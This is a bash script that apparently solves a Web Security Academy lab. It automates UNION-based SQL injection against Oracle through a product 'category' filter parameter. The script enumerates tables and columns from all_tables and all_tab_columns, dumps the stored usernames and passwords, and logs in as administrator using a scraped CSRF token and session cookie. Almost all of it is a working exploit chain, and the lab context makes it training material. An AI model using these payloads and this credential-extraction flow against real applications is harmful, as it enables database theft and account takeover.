#!/bin/bash
if [[ ${#1} -ne 32 ]]; then
	echo "USAGE: $0 subdomain";
	exit 1;
fi
url="https://$1.web-security-academy.net";

inject() {
	curl \
		-s \
		-G "$url/filter" \
		--data-urlencode "category=Gifts$1"
}


session() {
	response="$1";
	echo "$response" | grep '< Set-Cookie: session=' | cut -d'=' -f2 | cut -d';' -f1
}

login() {
	username="$1";
	password="$2";
	csrfResponse=$(curl -v -sG "$url/login" 2>&1);
	csrf=$(
		echo "$csrfResponse" |
		grep csrf |
		grep -Eo 'value=".+?"' |
		cut -d'"' -f2
	);
	
	session=$(session "$csrfResponse");
	redirectResponse=$(
		curl -v "$url/login" \
		--cookie "session=$session;" \
		--data-raw "csrf=$csrf&username=$targetUser&password=$password" 2>&1
	);

	# Redirect to /my-account
	session=$(session "$redirectResponse");
	echo "$redirectResponse";
	curl -v "$url/my-account" \
		--cookie "session=$session;"
}

usersTable=$(inject "' AND 1=0 UNION (SELECT table_name, null FROM all_tables WHERE table_name LIKE 'USERS_%') --" |
	grep 'USERS_' | tail -n1 | cut -d'>' -f2 | cut -d'<' -f1);
columnNames=$(inject "' AND 1=0 UNION (SELECT column_name, null FROM all_tab_columns WHERE (column_name LIKE 'USERNAME_%' OR column_name LIKE 'PASSWORD_%') AND table_name='$usersTable') --");
username_column=$(echo "$columnNames" | grep "USERNAME_" | tail -n1 | cut -d'>' -f2 | cut -d'<' -f1);
password_column=$(echo "$columnNames" | grep "PASSWORD_" | tail -n1 | cut -d'>' -f2 | cut -d'<' -f1);

credentials=$(inject "' AND 1=0 UNION (SELECT $username_column, $password_column FROM $usersTable) --");
targetUser="administrator";
password=$(echo "$credentials" | grep "$targetUser" -n1 | tail -n1 | cut -d'>' -f2 | cut -d'<' -f1)

# Complete the lab
login "$targetUser" "$password"